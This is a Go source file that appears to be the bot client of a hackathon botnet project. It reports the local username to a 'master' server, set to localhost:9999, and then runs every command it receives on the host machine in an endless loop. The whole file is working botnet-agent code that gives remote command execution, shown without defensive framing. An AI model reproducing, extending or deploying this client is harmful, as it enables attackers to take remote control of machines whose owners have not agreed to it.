package main

import (
	"encoding/json"
	"fmt"
	gonanoid "github.com/matoous/go-nanoid/v2"
	"github.com/tfpgh/treehacks-botnet-go/internal"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

const MASTER_HOST string = "localhost"
const MASTER_PORT uint16 = 9999

func generateBotName() (string, error) {
	id, err := gonanoid.New()
	if err != nil {
		// Failed to generate unique ID
		return "default", err
	}

	username := os.Getenv("USER")
	if len(username) > 0 {
		// Username was found. Returning username + id
		return fmt.Sprintf("%v-%v", username, id), nil
	} else {
		// No username. Just returning id
		return id, nil
	}

}

func beginConnection(host string, port uint16, name string) *net.Conn {
	connectionString := host + ":" + strconv.Itoa(int(port))
	connection, err := net.Dial("tcp", connectionString)

	if err != nil {
		fmt.Printf("Connection to master could not be established at %v. Panicking!\n", connectionString)
		panic(err)
	}

	helloPacketJSON, _ := json.Marshal(internal.HelloPacket{BotName: name})

	_, err = connection.Write(helloPacketJSON)
	if err != nil {
		fmt.Printf("Error writing: %v\n", err)
	}

	return &connection
}

func main() {
	botName, err := generateBotName()
	if err != nil {
		fmt.Printf("Failed to generate unique bot name, %v. Using \"%v\"\n", err, botName)
	} else {
		fmt.Printf("Generated unique bot name: \"%v\"\n", botName)
	}

	connection := beginConnection(MASTER_HOST, MASTER_PORT, botName)
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			fmt.Println("Error closing connection")
		}
	}(*connection)

	for {
		buffer := make([]byte, 128)
		bLen, err := (*connection).Read(buffer)
		if err != nil {
			fmt.Println("Error reading bot connection")
			time.Sleep(time.Millisecond * 500)
			continue
		}

		var commandPacket internal.CommandPacket
		err = json.Unmarshal(buffer[:bLen], &commandPacket)
		if err != nil {
			fmt.Println("Master sent invalid data")
			continue
		}
		command := strings.Split(commandPacket.Command, " ")
		if len(command) == 1 {
			output, _ := exec.Command(command[0]).Output()
			fmt.Println(string(output))
		} else {
			output, _ := exec.Command(command[0], command[1:]...).Output()
			fmt.Println(string(output))
		}

	}
}
